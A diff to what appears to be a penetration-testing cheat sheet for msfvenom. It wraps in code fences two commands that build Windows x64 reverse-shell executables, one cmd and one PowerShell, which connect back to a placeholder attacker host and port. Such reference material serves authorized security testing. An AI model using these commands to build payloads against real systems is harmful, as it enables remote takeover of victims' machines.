@@ -54,11 +54,15 @@ msfvenom -l payloads
 
 ### Getting a cmd .exe payload
 
+```shell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<mylocalhostip> LPORT=<myserverport> -f exe -o <name_of_the_exe>
+```
 
 ### Getting a powershell .exe payload
 
+```shell
 msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<mylocalhostip> LPORT=<myserverport> -f exe -o <name_of_the_exe>
+```
 
 ### Create a elf payload
 
